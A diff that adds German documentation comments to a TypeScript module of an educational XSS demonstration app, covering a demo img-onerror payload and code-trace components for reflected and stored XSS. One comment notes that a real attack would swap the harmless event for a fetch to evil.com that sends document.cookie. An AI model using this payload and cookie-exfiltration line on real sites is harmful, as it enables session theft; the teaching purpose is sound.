@@ -1,39 +1,79 @@
 import { Arrow, TraceBlock } from "@/components/CodeTrace"
 
-// ---------------------------------------------------------------------------
-// Payload
-// ---------------------------------------------------------------------------
-
+/**
+ * XSS-Demonstration-Payload.
+ *
+ * Ein `<img>`-Tag mit ungültigem `src`-Attribut. Der Browser versucht das Bild
+ * zu laden, schlägt sofort fehl und löst damit den `onerror`-Handler aus,
+ * der ein `CustomEvent("xss-triggered")` dispatcht. Dieses Event wird von
+ * {@link ReflectedXss} und {@link StoredXss} abgehört, um den XSS-Banner anzuzeigen.
+ *
+ * @remarks
+ * In einem echten Angriff würde `dispatchEvent(...)` durch z.B.
+ * `fetch('https://evil.com?c='+document.cookie)` ersetzt werden.
+ */
 export const XSS_PAYLOAD = `<img src=x onerror="document.dispatchEvent(new CustomEvent('xss-triggered'))">`
 
-// ---------------------------------------------------------------------------
-// Interfaces
-// ---------------------------------------------------------------------------
-
+/**
+ * Output-Daten der Reflected-XSS-Demonstration.
+ *
+ * Wird von {@link ReflectedXss} über den `onOutput`-Callback an
+ * {@link CrossSiteScripting} und weiter an {@link ReflectedCodeTrace} gereicht.
+ */
 export interface ReflectedOutput {
+  /** Der eingeschleuste Payload (entspricht {@link XSS_PAYLOAD}). */
   value: string
+  /** `true` wenn der sichere Render-Pfad gewählt wurde (aktuell immer `false`). */
   safe: boolean
 }
 
+/**
+ * Einzelner Kommentar-Eintrag aus der Datenbank.
+ *
+ * Entspricht dem `Comment`-Entity aus dem C#-Backend (`XssController`).
+ */
 export interface StoredComment {
   id: number
   content: string
   createdAt: string
 }
 
+/**
+ * Output-Daten der Stored-XSS-Demonstration.
+ *
+ * Wird von {@link StoredXss} über den `onOutput`-Callback an
+ * {@link CrossSiteScripting} und weiter an {@link StoredCodeTrace} gereicht.
+ */
 export interface StoredOutput {
+  /** `true` wenn der Angreifer den sicheren Endpunkt verwendet hat. */
   attackerSafe: boolean
+  /** Der vom Angreifer eingegebene Kommentar-Text. */
   attackerComment: string
+  /** `true` wenn der legitime User den sicheren Render-Pfad ausgelöst hat; `undefined` vor Schritt 2. */
   userSafe?: boolean
+  /** Alle gespeicherten Kommentare nach Schritt 2; `undefined` vor Schritt 2. */
   userEntries?: StoredComment[]
 }
 
-// ---------------------------------------------------------------------------
-// ReflectedCodeTrace
-// ---------------------------------------------------------------------------
-
+/**
+ * Verkürzte Anzeigeversion der manipulierten URL (ohne vollständigen Payload).
+ *
+ * Dient nur zur lesbaren Darstellung im Code-Trace — der echte Payload
+ * ist in {@link XSS_PAYLOAD} definiert.
+ */
 export const DISPLAY_URL = `https://seite.at/suche?q=<img src=x onerror="...">`
 
+/**
+ * Code-Trace-Komponente für die Reflected-XSS-Demonstration.
+ *
+ * Visualisiert den Angriffspfad in vier Schritten:
+ * Manipulierte URL → URL-Parameter auslesen → `dangerouslySetInnerHTML` → Script-Ausführung.
+ *
+ * Zeigt hover-aktivierte Tooltips an den kritischen Schritten ③ und ④,
+ * die die Sicherheitsprobleme erklären.
+ *
+ * @param output - Output-Daten aus {@link ReflectedXss}; `null` zeigt Platzhalter-Text.
+ */
 export function ReflectedCodeTrace({ output }: { output: ReflectedOutput | null }) {
   if (!output) {
     return (
@@ -103,6 +143,17 @@ const q = searchParams.get("q")
 // StoredCodeTrace
 // ---------------------------------------------------------------------------
 
+/**
+ * Code-Trace-Komponente für die Stored-XSS-Demonstration.
+ *
+ * Visualisiert den zweiphasigen Angriffspfad:
+ * - Phasen 1–3 (Angreifer): POST-Request → Backend-Encoding → DB-Wert
+ * - Phasen 4–6 (legitimer User, nach Schritt 2): GET-Request → Frontend-Render → Browser-Ergebnis
+ *
+ * Die Schritte 4–6 werden erst gerendert, sobald `output.userSafe` gesetzt ist.
+ *
+ * @param output - Output-Daten aus {@link StoredXss}; `null` zeigt Platzhalter-Text.
+ */
 export function StoredCodeTrace({ output }: { output: StoredOutput | null }) {
   if (!output) {
     return (
